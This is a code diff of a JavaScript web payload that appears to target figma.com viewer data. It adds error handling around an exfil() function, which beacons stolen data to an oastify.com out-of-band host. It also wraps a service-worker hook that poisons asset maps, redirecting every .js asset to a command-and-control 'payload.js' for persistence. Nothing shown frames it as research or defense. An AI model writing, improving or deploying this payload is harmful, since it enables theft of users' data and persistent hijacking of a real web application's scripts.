@@ -3,7 +3,12 @@
     const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
 
     function exfil(tag, data) {
-      navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
+      try {
+        const ok = navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
+        if (!ok) console.warn('[payload] sendBeacon queuing failed for:', tag);
+      } catch (err) {
+        console.warn('[payload] exfil error:', tag, err.message);
+      }
     }
 
     // Primary target — sensitive viewer data injected by figma.com
@@ -27,17 +32,22 @@
 
     // Re-hook SW for persistence
     if (navigator.serviceWorker && navigator.serviceWorker.controller) {
-      const ctrl = navigator.serviceWorker.controller;
-      const orig = ctrl.postMessage.bind(ctrl);
-      ctrl.postMessage = function(msg) {
-        if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
-          const poisoned = {...msg.assets};
-          for (const k of Object.keys(poisoned))
-            if (k.endsWith('.js')) poisoned[k] = C2 + '/payload.js';
-          return orig({...msg, assets: poisoned});
-        }
-        return orig(msg);
-      };
-      exfil('sw_rehooked', { scope: navigator.serviceWorker.controller.scriptURL });
+      try {
+        const ctrl = navigator.serviceWorker.controller;
+        const orig = ctrl.postMessage.bind(ctrl);
+        ctrl.postMessage = function(msg) {
+          if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
+            const poisoned = {...msg.assets};
+            for (const k of Object.keys(poisoned))
+              if (k.endsWith('.js')) poisoned[k] = C2 + '/payload.js';
+            return orig({...msg, assets: poisoned});
+          }
+          return orig(msg);
+        };
+        exfil('sw_rehooked', { scope: navigator.serviceWorker.controller.scriptURL });
+      } catch (err) {
+        console.warn('[payload] SW re-hook failed:', err.message);
+        exfil('sw_rehook_error', { error: err.message });
+      }
     }
   })();
